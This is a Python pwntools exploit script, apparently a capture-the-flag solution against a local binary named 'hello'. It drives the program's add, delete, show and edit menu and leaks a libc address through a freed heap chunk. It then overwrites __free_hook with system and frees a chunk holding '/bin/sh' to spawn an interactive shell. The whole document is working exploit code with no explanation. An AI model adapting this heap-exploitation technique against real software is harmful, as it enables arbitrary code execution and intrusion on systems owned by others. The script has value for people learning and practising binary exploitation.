from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

def cmd(cmd):
    p.recvuntil(">>")
    p.sendline(str(cmd))
def add(number,name,size,des):
    cmd(1)
    p.sendlineafter("number:",number)
    p.sendlineafter("name:",name)
    p.sendlineafter("size:",str(size))
    p.sendafter("info:",des)
def add_1(number,name,size):
    cmd(1)
    p.sendlineafter("number:",number)
    p.sendlineafter("name:",name)
    p.sendlineafter("size:",str(size))
def delete(id):
    cmd(2)
    p.sendlineafter("index:",str(id))
def show(id):
    cmd(3)
    p.sendlineafter("index:",str(id))
def edit(id,number,name,des):
    cmd(4)
    p.sendlineafter("index:",str(id))
    p.sendlineafter("number:",number)
    p.sendlineafter("name:",name)
    p.sendafter("info:",des)

p = process("./hello")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

add('a'*8,'b'*8,0x80,'c'*0x81)
add('a'*8,'b'*8,0x80,'c'*0x81)
add('a'*8,'b'*8,0x80,'/bin/sh\x00\n')
delete(0)
edit(0,'a'*8,'b'*(0xd-1),'c')
show(0)
main_arean_xx = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
log.info("main_arean_xx:"+hex(main_arean_xx))
libc_base = main_arean_xx - (0x7fa2625e2b78-0x7fa26221e000)
log.info("main_arean_xx:"+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
log.info("free_hook:"+hex(free_hook))
system_addr = libc_base + libc.sym['system']
log.info("system_addr:"+hex(system_addr))


# gdb.attach(p,"b *$rebase(0xde9)")

edit(1,'a'*8,'b'*0xd+p64(free_hook),p64(system_addr)+'\n')

delete(2)

p.interactive()